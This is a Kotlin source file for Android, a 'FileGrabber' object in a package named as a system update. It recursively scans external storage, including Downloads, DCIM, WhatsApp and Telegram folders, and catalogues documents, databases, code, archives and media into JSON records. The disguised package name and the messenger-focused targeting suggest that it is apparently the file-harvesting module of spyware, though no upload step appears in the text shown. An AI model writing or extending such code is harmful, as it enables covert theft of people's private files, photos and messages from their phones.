package com.sys.update2

import android.os.Environment
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

object FileGrabber {

    private val timeFmt = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)
    private const val MAX_FILE_MB = 45L

    data class FoundFile(
        val path: String,
        val name: String,
        val size: Long,
        val lastModified: Long,
        val ext: String
    )

    val DOCUMENTS = listOf("pdf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "txt", "csv", "rtf", "odt")
    val ARCHIVES = listOf("zip", "rar", "7z", "tar", "gz", "bz2", "xz")
    val APKS = listOf("apk", "apks", "xapk", "aab")
    val DATABASES = listOf("db", "sqlite", "sqlite3", "realm")
    val CODE = listOf("kt", "java", "py", "js", "html", "css", "xml", "json", "php", "rb", "go", "rs", "c", "cpp", "h")
    val VIDEOS = listOf("mp4", "mkv", "avi", "mov", "3gp", "webm", "flv", "wmv", "m4v")
    val AUDIOS = listOf("mp3", "wav", "ogg", "m4a", "aac", "flac", "opus", "amr")
    val IMAGES = listOf("jpg", "jpeg", "png", "gif", "webp", "bmp", "heic", "heif", "tiff")

    fun scanByTypes(types: List<String>, maxFiles: Int = 2000): List<FoundFile> {
        val result = mutableListOf<FoundFile>()
        val roots = listOf(
            Environment.getExternalStorageDirectory(),
            File("/storage/emulated/0/Download"),
            File("/storage/emulated/0/Documents"),
            File("/storage/emulated/0/DCIM"),
            File("/storage/emulated/0/Pictures"),
            File("/storage/emulated/0/Movies"),
            File("/storage/emulated/0/Music"),
            File("/storage/emulated/0/Android/media"),
            File("/storage/emulated/0/WhatsApp"),
            File("/storage/emulated/0/Telegram")
        )

        for (root in roots) {
            walk(root, types, result, 0, 8, maxFiles)
            if (result.size >= maxFiles) break
        }
        return result.distinctBy { it.path }.take(maxFiles)
    }

    private fun walk(
        dir: File?,
        types: List<String>,
        out: MutableList<FoundFile>,
        depth: Int,
        maxDepth: Int,
        limit: Int
    ) {
        if (dir == null || !dir.exists() || !dir.isDirectory) return
        if (depth > maxDepth || out.size >= limit) return

        val children = try { dir.listFiles() } catch (_: Exception) { null } ?: return

        for (f in children) {
            if (out.size >= limit) return
            try {
                if (f.isDirectory) {
                    if (f.name.startsWith(".")) continue
                    if (f.name == "cache" || f.name == "code_cache") continue
                    walk(f, types, out, depth + 1, maxDepth, limit)
                } else {
                    val ext = f.extension.lowercase(Locale.US)
                    if (types.contains(ext)) {
                        val sizeMb = f.length() / (1024 * 1024)
                        if (sizeMb <= MAX_FILE_MB) {
                            out.add(FoundFile(
                                path = f.absolutePath,
                                name = f.name,
                                size = f.length(),
                                lastModified = f.lastModified(),
                                ext = ext
                            ))
                        }
                    }
                }
            } catch (_: Exception) {}
        }
    }

    fun toJson(f: FoundFile): JSONObject = JSONObject().apply {
        put("type", "file")
        put("path", f.path)
        put("name", f.name)
        put("size", f.size)
        put("modified", timeFmt.format(Date(f.lastModified)))
        put("ext", f.ext)
    }
}
